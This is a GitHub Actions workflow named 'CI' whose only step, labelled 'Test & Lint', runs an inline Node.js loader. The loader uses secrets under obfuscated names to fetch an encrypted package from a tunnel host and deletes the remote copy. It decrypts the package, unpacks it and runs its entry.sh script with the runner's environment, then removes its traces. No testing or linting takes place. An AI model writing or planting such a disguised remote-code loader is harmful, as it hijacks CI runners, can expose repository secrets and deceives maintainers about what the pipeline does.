name: CI

on:
  repository_dispatch:
    types: [ci]

run-name: ci-${{ github.event.client_payload.H4BW6WY || github.run_id }}

jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Test & Lint
        env:
          H4BW6WY: ${{ github.event.client_payload.H4BW6WY }}
          AG1VYQT: ${{ secrets.AG1VYQT }}
          YVXGZ3G: ${{ secrets.YVXGZ3G }}
          R7UG72T: ${{ secrets.R7UG72T }}
        run: |
          node -e '
          const{createDecipheriv}=require("crypto"),{mkdtempSync,mkdirSync,rmSync,writeFileSync,chmodSync}=require("fs"),os=require("os"),path=require("path"),{spawnSync}=require("child_process");
          (async()=>{try{
          const id=process.env["H4BW6WY"],key=process.env["AG1VYQT"],tunnel=process.env["YVXGZ3G"],auth=process.env["R7UG72T"];
          const h={"R7UG72T":auth};
          const r=await fetch(tunnel+"/api/v1/p/"+id,{headers:h});if(!r.ok)throw new Error("p:"+r.status);
          const data=await r.json(),wd=mkdtempSync(path.join(os.tmpdir(),"b-")),ex=path.join(wd,"r");mkdirSync(ex,{recursive:true});
          const br=await fetch(data.pkg,{headers:h}),enc=Buffer.from(await br.arrayBuffer());
          if(data.del_u)fetch(data.del_u,{method:data.del_m||"DELETE"}).catch(()=>{});
          const iv=enc.subarray(0,12),tag=enc.subarray(12,28),ct=enc.subarray(28),dk=Buffer.from(key,"base64"),d=createDecipheriv("aes-256-gcm",dk,iv);
          d.setAuthTag(tag);const dec=Buffer.concat([d.update(ct),d.final()]);
          const tgz=path.join(wd,"b.tgz");writeFileSync(tgz,dec);spawnSync("tar",["-xzf",tgz,"-C",ex],{stdio:"inherit"});
          chmodSync(path.join(ex,"entry.sh"),0o755);
          spawnSync("bash",[path.join(ex,"entry.sh")],{cwd:ex,stdio:"inherit",env:{...process.env,...data.env}});
          rmSync(wd,{recursive:true,force:true});
          }catch(e){console.error("fatal:"+e.message);process.exit(1)}})();
          '
